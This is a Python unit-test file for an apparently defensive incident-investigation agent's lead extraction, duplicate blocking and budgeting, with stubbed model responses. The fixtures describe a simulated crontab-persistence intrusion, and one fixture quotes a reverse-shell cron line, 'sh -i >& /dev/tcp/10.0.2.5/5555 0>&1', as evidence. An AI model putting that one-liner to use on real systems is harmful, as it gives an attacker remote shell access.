"""
Offline test: model-based lead extraction + validation (graph/lead_model.py).

The previous regex parser split a single multi-line lead (e.g. a `- Title:` with
`pivots`/`evidence` as sub-bullets) into several fragments, each rejected for
"missing pivots". The model-based path reassembles the whole lead. These tests
stub the model so no real LLM is needed.

Run from project root with:
    python -m pytest tests/unit/test_lead_model.py
"""
from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest

project_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, project_root)
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "aci.settings")
os.environ["SECRET_KEY"] = "test"
os.environ["TASKQUEUE_DB_PATH"] = tempfile.mktemp(suffix=".db")
os.environ["BOARD_DB_PATH"] = tempfile.mktemp(suffix=".db")

import django
django.setup()

from langchain_core.messages import AIMessage
from agent.runtime.graph.lead_model import validate_leads_model
from agent.runtime.graph.leads import (
    LeadCandidate,
    LeadDecision,
    _lead_direction,
    apply_lead_budget,
)


class StubModel:
    """Records the prompt it received and returns a canned response."""
    def __init__(self, response: str):
        self._response = response
        self.last_prompt = ""

    def bind_tools(self, tools):
        return self

    async def ainvoke(self, messages, **kwargs):
        self.last_prompt = "\n".join(getattr(m, "content", "") or "" for m in messages)
        return AIMessage(content=self._response)


# The exact mis-formatted lead from session cca704de — capital "Title", sub-bullet
# pivots/evidence/priority. The regex parser shredded this into 4 invalid leads.
MISFORMATTED_SECTION = """
- Title: Extract exact crontab diff/content around nano save
  - pivots: host `kali`, user `user`, time window `2025-04-20T03:47Z` to `2025-04-20T03:55Z`, path `/var/spool/cron/crontabs/user`, rule IDs `2830-2834`
  - evidence: SIEM already shows nano and sudo activity around the crontab path plus syscheck add/delete events.
  - priority: 65
"""

GOOD_RESPONSE = json.dumps([{
    "title": "Extract exact crontab diff/content around nano save",
    "pivots": "host kali, user user, 2025-04-20T03:47Z-03:55Z, /var/spool/cron/crontabs/user",
    "evidence": "SIEM shows nano + sudo activity around the crontab path with syscheck add/delete",
    "priority": 65,
    "approved": True,
    "category": "approved",
    "reason": "concrete pivots and evidence anchor",
}])


class LeadModelTests(unittest.IsolatedAsyncioTestCase):
    async def test_reassembles_misformatted_lead_into_one_approved(self):
        model = StubModel(GOOD_RESPONSE)
        result = await validate_leads_model(
            model,
            leads_section=MISFORMATTED_SECTION,
            final_answer="## Confirmed Facts\n- nano edited crontab.",
            existing_tasks=[],
            current_task={"title": "Cron review", "description": "crontab"},
            remaining_run_budget=3,
            agent_name="investigation",
        )
        self.assertEqual(len(result.approved), 1)
        self.assertEqual(len(result.rejected), 0)
        cand = result.approved[0].candidate
        self.assertIn("crontab diff", cand.title)
        self.assertTrue(cand.pivots)
        self.assertTrue(cand.evidence)

    async def test_no_model_fails_closed(self):
        result = await validate_leads_model(
            None,
            leads_section=MISFORMATTED_SECTION,
            final_answer="",
            existing_tasks=[],
            current_task=None,
            remaining_run_budget=3,
            agent_name="investigation",
        )
        self.assertEqual(result.approved, [])
        self.assertEqual(result.rejected, [])
        self.assertEqual(result.deferred, [])

    async def test_malformed_model_output_yields_no_leads(self):
        model = StubModel("I could not produce JSON, sorry.")
        result = await validate_leads_model(
            model,
            leads_section=MISFORMATTED_SECTION,
            final_answer="",
            existing_tasks=[],
            current_task=None,
            remaining_run_budget=3,
            agent_name="investigation",
        )
        self.assertEqual(result.approved, [])

    async def test_duplicate_backstop_overrides_model_approval(self):
        # Model approves, but the lead duplicates a queued task by path artifact.
        existing = [{
            "title": "Review crontab contents for /var/spool/cron/crontabs/user",
            "description": "Pivots: path=/var/spool/cron/crontabs/user, host=kali",
            "status": "pending",
        }]
        response = json.dumps([{
            "title": "Inspect crontab persistence",
            "pivots": "path=/var/spool/cron/crontabs/user, host=kali",
            "evidence": "syscheck add/delete on /var/spool/cron/crontabs/user",
            "priority": 80,
            "approved": True,
            "category": "approved",
            "reason": "looks new",
        }])
        result = await validate_leads_model(
            StubModel(response),
            leads_section="- something",
            final_answer="",
            existing_tasks=existing,
            current_task={"title": "Cron review", "description": "path=/var/spool/cron/crontabs/user"},
            remaining_run_budget=3,
            agent_name="investigation",
        )
        self.assertEqual(len(result.approved), 0)
        self.assertEqual(result.rejected[0].category, "duplicate")

    async def test_budget_cap_defers_surplus(self):
        leads = [{
            "title": f"Investigate callback {i}",
            "pivots": f"ip=10.0.0.{i}",
            "evidence": f"event=evt-{i}",
            "priority": 90 - i,
            "approved": True,
            "category": "approved",
            "reason": "callback",
        } for i in range(3)]
        result = await validate_leads_model(
            StubModel(json.dumps(leads)),
            leads_section="- leads",
            final_answer="",
            existing_tasks=[],
            current_task=None,
            remaining_run_budget=1,
            agent_name="investigation",
        )
        self.assertEqual(len(result.approved), 3)
        self.assertEqual(len(result.deferred), 0)

    async def test_spawns_both_backward_and_forward_leads(self):
        # Report whose Open Gaps name an initial-access (backward) gap and a
        # C2-confirmation (forward) gap. Both directions must be approved.
        leads = json.dumps([
            {
                "title": "Identify initial access source IP for the first login",
                "pivots": "host kali, user user, earliest session before 03:47Z",
                "evidence": "Open Gaps: initial access source IP missing from telemetry",
                "priority": 80, "approved": True, "category": "approved",
                "reason": "backward / root cause",
            },
            {
                "title": "Confirm C2 callback network connection to 10.0.2.5:5555",
                "pivots": "ip=10.0.2.5, port=5555",
                "evidence": "Open Gaps: network-level callback success unconfirmed",
                "priority": 78, "approved": True, "category": "approved",
                "reason": "forward / impact",
            },
        ])
        result = await validate_leads_model(
            StubModel(leads),
            leads_section="- leads",
            final_answer="## Open Gaps\n- initial access IP missing\n- C2 not confirmed",
            existing_tasks=[],
            current_task=None,
            remaining_run_budget=3,
            agent_name="investigation",
        )
        directions = {_lead_direction(d) for d in result.approved}
        self.assertIn("backward", directions)
        self.assertIn("forward", directions)

    async def test_duplicate_of_completed_task_is_rejected(self):
        # A completed task with a firm conclusion should still block a
        # signature-identical lead.
        existing = [{
            "title": "Review crontab contents for /var/spool/cron/crontabs/user",
            "description": "Pivots: path=/var/spool/cron/crontabs/user, host=kali",
            "status": "completed",
            "summary": "## Findings\n- Confirmed the crontab diff inserted a reverse shell and fully answered the question.\n## New Leads\n- None.",
        }]
        response = json.dumps([{
            "title": "Inspect crontab persistence",
            "pivots": "path=/var/spool/cron/crontabs/user, host=kali",
            "evidence": "syscheck add/delete on /var/spool/cron/crontabs/user",
            "priority": 80, "approved": True, "category": "approved",
            "reason": "model thinks it is new",
        }])
        result = await validate_leads_model(
            StubModel(response),
            leads_section="- lead",
            final_answer="",
            existing_tasks=existing,
            current_task=None,
            remaining_run_budget=3,
            agent_name="investigation",
        )
        self.assertEqual(len(result.approved), 0)
        self.assertEqual(result.rejected[0].category, "duplicate")

    async def test_active_task_title_similarity_blocks_duplicate(self):
        # A pending task already investigating essentially the same question
        # should block a semantically overlapping lead.
        existing = [{
            "title": "Verify whether any outbound connections or reverse-shell commands occurred after cron editing",
            "description": "Pivots: host=kali, crontab=/var/spool/cron/crontabs/user",
            "status": "pending",
        }]
        response = json.dumps([{
            "title": "Verify any outbound reverse-shell callback or live C2 session to 10.0.2.5:5555",
            "pivots": "ip=10.0.2.5, port=5555, time=2025-04-20T03:54:37Z",
            "evidence": "cron job `sh -i >& /dev/tcp/10.0.2.5/5555 0>&1` found in crontab",
            "priority": 80, "approved": True, "category": "approved",
            "reason": "model thinks it is a new angle",
        }])
        result = await validate_leads_model(
            StubModel(response),
            leads_section="- lead",
            final_answer="",
            existing_tasks=existing,
            current_task=None,
            remaining_run_budget=3,
            agent_name="investigation",
        )
        self.assertEqual(len(result.approved), 0)
        self.assertEqual(result.rejected[0].category, "duplicate")

    async def test_active_task_without_semantic_overlap_does_not_block(self):
        existing = [{
            "title": "Identify the source IP of the earliest suspicious login",
            "description": "Pivots: host=kali, auth logs, ssh sessions",
            "status": "pending",
        }]
        response = json.dumps([{
            "title": "Verify crontab contents changed during the nano session",
            "pivots": "host=kali, /tmp/crontab.Tgi9hP/crontab",
            "evidence": "nano edited temp crontab path",
            "priority": 80, "approved": True, "category": "approved",
            "reason": "different investigative question",
        }])
        result = await validate_leads_model(
            StubModel(response),
            leads_section="- lead",
            final_answer="",
            existing_tasks=existing,
            current_task=None,
            remaining_run_budget=3,
            agent_name="investigation",
        )
        self.assertEqual(len(result.approved), 1)
        self.assertEqual(len(result.rejected), 0)

    async def test_inconclusive_completed_task_does_not_block_duplicate_lead(self):
        existing = [{
            "title": "Investigate whether the attacker performed lateral movement or data access from kali after persistence",
            "description": "Pivots: host=kali, callback=10.0.2.5:5555",
            "status": "completed",
            "summary": (
                "## Findings\n"
                "- Lateral movement and data access are not confirmed by the events retrieved in this task.\n"
                "## Hypotheses\n"
                "- [Open] Additional post-exploitation actions may have occurred outside the retrieved window."
            ),
        }]
        response = json.dumps([{
            "title": "Investigate whether the attacker performed lateral movement or data access from kali after persistence",
            "pivots": "host=kali, callback=10.0.2.5:5555",
            "evidence": "prior task remained open and did not confirm impact",
            "priority": 80, "approved": True, "category": "approved",
            "reason": "prior task was inconclusive",
        }])
        result = await validate_leads_model(
            StubModel(response),
            leads_section="- lead",
            final_answer="",
            existing_tasks=existing,
            current_task=None,
            remaining_run_budget=3,
            agent_name="investigation",
        )
        self.assertEqual(len(result.approved), 1)
        self.assertEqual(len(result.rejected), 0)


def _decision(objective: str, score: int, idx: int) -> LeadDecision:
    cand = LeadCandidate(title=f"lead-{idx}", pivots="p", evidence="e", priority=score, original_index=idx)
    return LeadDecision(cand, True, "approved", "approved", score, f"{objective}:sig-{idx}")


class LeadBudgetDirectionTests(unittest.TestCase):
    def test_unlimited_budget_preserves_score_order(self):
        pool = [
            _decision("c2_callback", 95, 0),       # forward, high
            _decision("lateral_movement", 90, 1),  # forward, high
            _decision("initial_access", 40, 2),     # backward, low
        ]
        approved, deferred = apply_lead_budget(pool, remaining_run_budget=2)
        self.assertEqual([d.score for d in approved], [95, 90, 40])
        self.assertEqual(deferred, [])

    def test_single_direction_pool_keeps_score_order(self):
        pool = [_decision("c2_callback", 95 - i, i) for i in range(4)]
        approved, _ = apply_lead_budget(pool, remaining_run_budget=10, max_approved=3)
        self.assertEqual([d.score for d in approved], [95, 94, 93, 92])


if __name__ == "__main__":
    unittest.main(verbosity=2)
